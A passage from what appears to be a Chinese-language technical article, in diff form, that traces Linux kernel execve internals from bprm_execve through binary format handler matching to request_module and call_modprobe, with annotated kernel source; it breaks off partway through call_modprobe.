+<p><code>bprm_execve</code>函数会先对被加载程序的信息准备凭证与安全检查，最后调用<code>exec_binprm</code>函数加载可执行文件。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">int</span> <span class="nf">bprm_execve</span><span class="p">(</span><span class="k">struct</span> <span class="n">linux_binprm</span> <span class="o">*</span><span class="n">bprm</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="kt">int</span> <span class="n">retval</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="n">retval</span> <span class="o">=</span> <span class="nf">prepare_bprm_creds</span><span class="p">(</span><span class="n">bprm</span><span class="p">);</span>  <span class="c1">//准备执行凭据
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="k">if</span> <span class="p">(</span><span class="n">retval</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="n">retval</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="nf">check_unsafe_exec</span><span class="p">(</span><span class="n">bprm</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="n">current</span><span class="o">-&gt;</span><span class="n">in_execve</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>  <span class="c1">//执行状态标记，表示当前进程正处于 execve 中
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="nf">sched_mm_cid_before_execve</span><span class="p">(</span><span class="n">current</span><span class="p">);</span> <span class="c1">//检查是否允许执行，是否运行提权
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">	<span class="nf">sched_exec</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="n">retval</span> <span class="o">=</span> <span class="nf">security_bprm_creds_for_exec</span><span class="p">(</span><span class="n">bprm</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="n">retval</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">		<span class="k">goto</span> <span class="n">out</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="n">retval</span> <span class="o">=</span> <span class="nf">exec_binprm</span><span class="p">(</span><span class="n">bprm</span><span class="p">);</span>  <span class="c1">//进入二进制加载核心
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="k">if</span> <span class="p">(</span><span class="n">retval</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">		<span class="k">goto</span> <span class="n">out</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="nf">sched_mm_cid_after_execve</span><span class="p">(</span><span class="n">current</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="n">current</span><span class="o">-&gt;</span><span class="n">in_execve</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">rseq_execve</span><span class="p">(</span><span class="n">current</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">user_events_execve</span><span class="p">(</span><span class="n">current</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">acct_update_integrals</span><span class="p">(</span><span class="n">current</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">task_numa_free</span><span class="p">(</span><span class="n">current</span><span class="p">,</span> <span class="nb">false</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="n">retval</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nl">out</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="n">bprm</span><span class="o">-&gt;</span><span class="n">point_of_no_return</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nf">fatal_signal_pending</span><span class="p">(</span><span class="n">current</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">		<span class="nf">force_fatal_sig</span><span class="p">(</span><span class="n">SIGSEGV</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="nf">sched_mm_cid_after_execve</span><span class="p">(</span><span class="n">current</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="n">current</span><span class="o">-&gt;</span><span class="n">in_execve</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="n">retval</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><h3 id="exec_binprm">exec_binprm<a hidden class="anchor" aria-hidden="true" href="#exec_binprm">#</a></h3>
+<p><code>exec_binprm</code>函数负责在执行过程中选择并执行合适的二进制格式处理器，通过循环解析解释器链，最终完成可执行文件的确定并触发执行成功事件通知。</p>
+<p>其中最重要的逻辑就是解析选择合适的二进制格式处理器部分，因此我们接下来需要跟进<code>search_binary_handler</code>函数分析。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">int</span> <span class="nf">exec_binprm</span><span class="p">(</span><span class="k">struct</span> <span class="n">linux_binprm</span> <span class="o">*</span><span class="n">bprm</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="kt">pid_t</span> <span class="n">old_pid</span><span class="p">,</span> <span class="n">old_vpid</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="kt">int</span> <span class="n">ret</span><span class="p">,</span> <span class="n">depth</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="n">old_pid</span> <span class="o">=</span> <span class="n">current</span><span class="o">-&gt;</span><span class="n">pid</span><span class="p">;</span>  <span class="c1">//保存执行前的 PID 信息
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="nf">rcu_read_lock</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">	<span class="n">old_vpid</span> <span class="o">=</span> <span class="nf">task_pid_nr_ns</span><span class="p">(</span><span class="n">current</span><span class="p">,</span> <span class="nf">task_active_pid_ns</span><span class="p">(</span><span class="n">current</span><span class="o">-&gt;</span><span class="n">parent</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">rcu_read_unlock</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="c1">//解析主循环
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="k">for</span> <span class="p">(</span><span class="n">depth</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;;</span> <span class="n">depth</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="n">exec</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="p">(</span><span class="n">depth</span> <span class="o">&gt;</span> <span class="mi">5</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">			<span class="k">return</span> <span class="o">-</span><span class="n">ELOOP</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">		<span class="n">ret</span> <span class="o">=</span> <span class="nf">search_binary_handler</span><span class="p">(</span><span class="n">bprm</span><span class="p">);</span>  <span class="c1">//根据文件内容选择合适的处理器
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="k">if</span> <span class="p">(</span><span class="n">ret</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">			<span class="k">return</span> <span class="n">ret</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">bprm</span><span class="o">-&gt;</span><span class="n">interpreter</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">			<span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">		<span class="n">exec</span> <span class="o">=</span> <span class="n">bprm</span><span class="o">-&gt;</span><span class="n">file</span><span class="p">;</span> <span class="c1">// 解释器替换，下一轮执行的主角从原文件变成解释器本身
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="n">bprm</span><span class="o">-&gt;</span><span class="n">file</span> <span class="o">=</span> <span class="n">bprm</span><span class="o">-&gt;</span><span class="n">interpreter</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">		<span class="n">bprm</span><span class="o">-&gt;</span><span class="n">interpreter</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">		<span class="nf">allow_write_access</span><span class="p">(</span><span class="n">exec</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="p">(</span><span class="nf">unlikely</span><span class="p">(</span><span class="n">bprm</span><span class="o">-&gt;</span><span class="n">have_execfd</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">			<span class="k">if</span> <span class="p">(</span><span class="n">bprm</span><span class="o">-&gt;</span><span class="n">executable</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">				<span class="nf">fput</span><span class="p">(</span><span class="n">exec</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">				<span class="k">return</span> <span class="o">-</span><span class="n">ENOEXEC</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">			<span class="p">}</span>
+</span></span><span class="line"><span class="cl">			<span class="n">bprm</span><span class="o">-&gt;</span><span class="n">executable</span> <span class="o">=</span> <span class="n">exec</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">		<span class="p">}</span> <span class="k">else</span>
+</span></span><span class="line"><span class="cl">			<span class="nf">fput</span><span class="p">(</span><span class="n">exec</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">//执行成功后的系统通知
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="nf">audit_bprm</span><span class="p">(</span><span class="n">bprm</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">trace_sched_process_exec</span><span class="p">(</span><span class="n">current</span><span class="p">,</span> <span class="n">old_pid</span><span class="p">,</span> <span class="n">bprm</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">ptrace_event</span><span class="p">(</span><span class="n">PTRACE_EVENT_EXEC</span><span class="p">,</span> <span class="n">old_vpid</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">proc_exec_connector</span><span class="p">(</span><span class="n">current</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><h3 id="search_binary_handler">search_binary_handler<a hidden class="anchor" aria-hidden="true" href="#search_binary_handler">#</a></h3>
+<p><code>search_binary_handler</code>函数会在<code>formats</code>链表中寻找合适的文件加载器。<code>formats</code>是一个包含所有已注册的可执行格式文件解析器。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">int</span> <span class="nf">search_binary_handler</span><span class="p">(</span><span class="k">struct</span> <span class="n">linux_binprm</span> <span class="o">*</span><span class="n">bprm</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="kt">bool</span> <span class="n">need_retry</span> <span class="o">=</span> <span class="nf">IS_ENABLED</span><span class="p">(</span><span class="n">CONFIG_MODULES</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="k">struct</span> <span class="n">linux_binfmt</span> <span class="o">*</span><span class="n">fmt</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="kt">int</span> <span class="n">retval</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="n">retval</span> <span class="o">=</span> <span class="nf">prepare_binprm</span><span class="p">(</span><span class="n">bprm</span><span class="p">);</span>  <span class="c1">//读取文件前 128 字节
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="k">if</span> <span class="p">(</span><span class="n">retval</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="n">retval</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="n">retval</span> <span class="o">=</span> <span class="nf">security_bprm_check</span><span class="p">(</span><span class="n">bprm</span><span class="p">);</span>  <span class="c1">//安全检查
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="k">if</span> <span class="p">(</span><span class="n">retval</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="n">retval</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="n">retval</span> <span class="o">=</span> <span class="o">-</span><span class="n">ENOENT</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"> <span class="nl">retry</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">read_lock</span><span class="p">(</span><span class="o">&amp;</span><span class="n">binfmt_lock</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// 解析器匹配循环
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="nf">list_for_each_entry</span><span class="p">(</span><span class="n">fmt</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">formats</span><span class="p">,</span> <span class="n">lh</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nf">try_module_get</span><span class="p">(</span><span class="n">fmt</span><span class="o">-&gt;</span><span class="n">module</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">			<span class="k">continue</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">		<span class="nf">read_unlock</span><span class="p">(</span><span class="o">&amp;</span><span class="n">binfmt_lock</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">		<span class="n">retval</span> <span class="o">=</span> <span class="n">fmt</span><span class="o">-&gt;</span><span class="nf">load_binary</span><span class="p">(</span><span class="n">bprm</span><span class="p">);</span>  <span class="c1">//检查文件魔数，判断文件格式
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">		<span class="nf">read_lock</span><span class="p">(</span><span class="o">&amp;</span><span class="n">binfmt_lock</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">		<span class="nf">put_binfmt</span><span class="p">(</span><span class="n">fmt</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="p">(</span><span class="n">bprm</span><span class="o">-&gt;</span><span class="n">point_of_no_return</span> <span class="o">||</span> <span class="p">(</span><span class="n">retval</span> <span class="o">!=</span> <span class="o">-</span><span class="n">ENOEXEC</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">			<span class="nf">read_unlock</span><span class="p">(</span><span class="o">&amp;</span><span class="n">binfmt_lock</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">			<span class="k">return</span> <span class="n">retval</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">		<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">read_unlock</span><span class="p">(</span><span class="o">&amp;</span><span class="n">binfmt_lock</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">//没有找到解析器
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="k">if</span> <span class="p">(</span><span class="n">need_retry</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="p">(</span><span class="nf">printable</span><span class="p">(</span><span class="n">bprm</span><span class="o">-&gt;</span><span class="n">buf</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nf">printable</span><span class="p">(</span><span class="n">bprm</span><span class="o">-&gt;</span><span class="n">buf</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span> <span class="o">&amp;&amp;</span>
+</span></span><span class="line"><span class="cl">		    <span class="nf">printable</span><span class="p">(</span><span class="n">bprm</span><span class="o">-&gt;</span><span class="n">buf</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nf">printable</span><span class="p">(</span><span class="n">bprm</span><span class="o">-&gt;</span><span class="n">buf</span><span class="p">[</span><span class="mi">3</span><span class="p">]))</span>
+</span></span><span class="line"><span class="cl">			<span class="k">return</span> <span class="n">retval</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="p">(</span><span class="nf">request_module</span><span class="p">(</span><span class="s">&#34;binfmt-%04x&#34;</span><span class="p">,</span> <span class="o">*</span><span class="p">(</span><span class="n">ushort</span> <span class="o">*</span><span class="p">)(</span><span class="n">bprm</span><span class="o">-&gt;</span><span class="n">buf</span> <span class="o">+</span> <span class="mi">2</span><span class="p">))</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">			<span class="k">return</span> <span class="n">retval</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">		<span class="n">need_retry</span> <span class="o">=</span> <span class="nb">false</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">		<span class="k">goto</span> <span class="n">retry</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="n">retval</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>常见的解析器：</p>
+<ul>
+<li><code>elf_format</code>： ELF 可执行程序；</li>
+<li><code>compat_elf_format</code>：兼容 ELF（与 ELF 基本相同）；</li>
+<li><code>script_format</code>：<code>#!</code>开头的脚本；</li>
+<li><code>misc_format</code>：其他格式，由内核模块注册。</li>
+</ul>
+<p>每种解析器包含一个关键字段<code>load_binary</code>，其中包含着对应格式的加载函数。</p>
+<p>检查文件魔数，匹配解析器：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">retval</span> <span class="o">=</span> <span class="n">fmt</span><span class="o">-&gt;</span><span class="nf">load_binary</span><span class="p">(</span><span class="n">bprm</span><span class="p">);</span>  <span class="c1">//检查文件魔数，判断文件格式
+</span></span></span></code></pre></div><p>例如 ELF 格式：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="c1">//检查是否为 ELF 魔数 \x7FELF
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">if</span> <span class="p">(</span><span class="nf">memcmp</span><span class="p">(</span><span class="n">elf_ex</span><span class="o">-&gt;</span><span class="n">e_ident</span><span class="p">,</span> <span class="n">ELFMAG</span><span class="p">,</span> <span class="n">SELFMAG</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">goto</span> <span class="n">out</span><span class="p">;</span>
+</span></span></code></pre></div><p>如果成功匹配到解析器，内核将调用该格式对应格式的加载函数完成可执行文件的加载（如 ELF 文件或 shell 文件）。</p>
+<p>如果没有匹配到解析器，且文件的前 4 字节不可打印（非 ASCII），内核会进入一个兜底处理流程。在在该流程中，内核会根据可执行文件头部的魔数值，动态请求加载对应的 binfmt 内核模块。具体做法是从文件头的第 3、4 字节读取一个 16 位数值，并将其格式化为模块名 <code>binfmt-xxxx</code>，随后调用<code>request_module</code>触发模块加载：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nf">request_module</span><span class="p">(</span><span class="s">&#34;binfmt-%04x&#34;</span><span class="p">,</span> <span class="o">*</span><span class="p">(</span><span class="n">ushort</span> <span class="o">*</span><span class="p">)(</span><span class="n">bprm</span><span class="o">-&gt;</span><span class="n">buf</span> <span class="o">+</span> <span class="mi">2</span><span class="p">))</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">retval</span><span class="p">;</span>
+</span></span></code></pre></div><h3 id="request_module">request_module<a hidden class="anchor" aria-hidden="true" href="#request_module">#</a></h3>
+<p><code>request_module</code>其实是一个宏，真正执行的是<code>__request_module</code>函数：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#define request_module(mod...) __request_module(true, mod)
+</span></span></span></code></pre></div><p><code>__request_module</code>函数最终会调用<code>call_modprobe</code>函数。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">__request_module</span><span class="p">(</span><span class="kt">bool</span> <span class="n">wait</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">fmt</span><span class="p">,</span> <span class="p">...)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="n">va_list</span> <span class="n">args</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="kt">char</span> <span class="n">module_name</span><span class="p">[</span><span class="n">MODULE_NAME_LEN</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">	<span class="kt">int</span> <span class="n">ret</span><span class="p">,</span> <span class="n">dup_ret</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="nf">WARN_ON_ONCE</span><span class="p">(</span><span class="n">wait</span> <span class="o">&amp;&amp;</span> <span class="nf">current_is_async</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">modprobe_path</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="o">-</span><span class="n">ENOENT</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="nf">va_start</span><span class="p">(</span><span class="n">args</span><span class="p">,</span> <span class="n">fmt</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="n">ret</span> <span class="o">=</span> <span class="nf">vsnprintf</span><span class="p">(</span><span class="n">module_name</span><span class="p">,</span> <span class="n">MODULE_NAME_LEN</span><span class="p">,</span> <span class="n">fmt</span><span class="p">,</span> <span class="n">args</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">va_end</span><span class="p">(</span><span class="n">args</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="n">ret</span> <span class="o">&gt;=</span> <span class="n">MODULE_NAME_LEN</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="o">-</span><span class="n">ENAMETOOLONG</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="n">ret</span> <span class="o">=</span> <span class="nf">security_kernel_module_request</span><span class="p">(</span><span class="n">module_name</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="n">ret</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="n">ret</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="n">ret</span> <span class="o">=</span> <span class="nf">down_timeout</span><span class="p">(</span><span class="o">&amp;</span><span class="n">kmod_concurrent_max</span><span class="p">,</span> <span class="n">MAX_KMOD_ALL_BUSY_TIMEOUT</span> <span class="o">*</span> <span class="n">HZ</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="n">ret</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="nf">pr_warn_ratelimited</span><span class="p">(</span><span class="s">&#34;request_module: modprobe %s cannot be processed, kmod busy with %d threads for more than %d seconds now&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">				    <span class="n">module_name</span><span class="p">,</span> <span class="n">MAX_KMOD_CONCURRENT</span><span class="p">,</span> <span class="n">MAX_KMOD_ALL_BUSY_TIMEOUT</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="n">ret</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="nf">trace_module_request</span><span class="p">(</span><span class="n">module_name</span><span class="p">,</span> <span class="n">wait</span><span class="p">,</span> <span class="n">_RET_IP_</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="nf">kmod_dup_request_exists_wait</span><span class="p">(</span><span class="n">module_name</span><span class="p">,</span> <span class="n">wait</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">dup_ret</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="n">ret</span> <span class="o">=</span> <span class="n">dup_ret</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">		<span class="k">goto</span> <span class="n">out</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="n">ret</span> <span class="o">=</span> <span class="nf">call_modprobe</span><span class="p">(</span><span class="n">module_name</span><span class="p">,</span> <span class="n">wait</span> <span class="o">?</span> <span class="nl">UMH_WAIT_PROC</span> <span class="p">:</span> <span class="n">UMH_WAIT_EXEC</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nl">out</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">up</span><span class="p">(</span><span class="o">&amp;</span><span class="n">kmod_concurrent_max</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="n">ret</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="nf">EXPORT_SYMBOL</span><span class="p">(</span><span class="n">__request_module</span><span class="p">);</span>
+</span></span></code></pre></div><h3 id="call_modprobe">call_modprobe<a hidden class="anchor" aria-hidden="true" href="#call_modprobe">#</a></h3>
+<p><code>call_modprobe</code>是内核模块自动加载路径中真正执行用户态程序的函数：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">int</span> <span class="nf">call_modprobe</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">orig_module_name</span><span class="p">,</span> <span class="kt">int</span> <span class="n">wait</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="k">struct</span> <span class="n">subprocess_info</span> <span class="o">*</span><span class="n">info</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="k">static</span> <span class="kt">char</span> <span class="o">*</span><span class="n">envp</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="s">&#34;HOME=/&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">		<span class="s">&#34;TERM=linux&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">		<span class="s">&#34;PATH=/sbin:/usr/sbin:/bin:/usr/bin&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">		<span class="nb">NULL</span>
+</span></span><span class="line"><span class="cl">	<span class="p">};</span>
+</span></span><span class="line"><span class="cl">	<span class="kt">char</span> <span class="o">*</span><span class="n">module_name</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="kt">int</span> <span class="n">ret</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="kt">char</span> <span class="o">**</span><span class="n">argv</span> <span class="o">=</span> <span class="nf">kmalloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">[</span><span class="mi">5</span><span class="p">]),</span> <span class="n">GFP_KERNEL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">argv</span><span class="p">)</span>
